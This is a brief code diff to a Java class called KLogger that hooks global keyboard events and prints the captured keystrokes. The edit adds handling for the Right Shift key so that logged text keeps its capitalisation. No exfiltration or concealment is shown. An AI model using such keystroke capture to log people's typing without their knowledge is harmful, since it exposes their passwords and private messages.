@@ -24,7 +24,7 @@ public class KLogger implements NativeKeyListener {
             System.out.println("");
             System.out.println(input);
             input = "";
-        } else if (key.equals("Left Shift")) {
+        } else if (key.equals("Left Shift") || key.equals("Right Shift")) {
             shiftPressed = true;
         } else {
             if (!shiftPressed) key = key.toLowerCase();
@@ -35,7 +35,7 @@ public class KLogger implements NativeKeyListener {
     @Override
     public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
         String key = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
-        if (key.equals("Left Shift")) shiftPressed = false;
+        if (key.equals("Left Shift") || key.equals("Right Shift")) shiftPressed = false;
     }
 
     @Override
